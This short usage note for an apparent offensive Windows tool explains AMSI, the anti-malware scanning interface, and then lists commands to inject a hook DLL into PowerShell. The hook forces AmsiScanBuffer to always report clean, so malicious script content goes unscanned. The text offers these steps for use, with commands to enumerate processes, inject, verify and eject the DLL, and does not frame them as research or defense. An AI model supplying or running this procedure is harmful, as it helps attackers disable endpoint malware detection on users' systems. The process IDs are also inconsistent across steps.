Hook AmsiScanBuffer and send an "ok" result, always.

AMSI stands for Anti-Malware Scan Interface and was introduced in Windows 10. 
The name is reasonably self-explanatory; 
this is an interface that applications and services are able to utilise, 
sending “content” to an anti-malware provider installed on the system (e.g. Windows Defender).

How to proceed:</br></br>

Lets retrieve the pid of our target victim (here powershell) : nthash-win64 /enumproc | findstr powershell</br>
NTHASH-win64.exe /inject /pid:123 /binary:c:\temp\hook-win64.dll</br>
optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid:808 | findstr hook</br>
Launch powershell and test a sensible keyword such as 'AmsiScanBuffer' and notice it does not trigger AMSI
NTHASH-win64.exe /eject /pid:123 /binary:hook-win64.dll</br>
optionally, check that our dll as been ejected : NTHASH-win64.exe /enummod /pid:808 | findstr hook</br>
optionally check c:\log.txt to make sure the hook went fine</br>
</br></br>

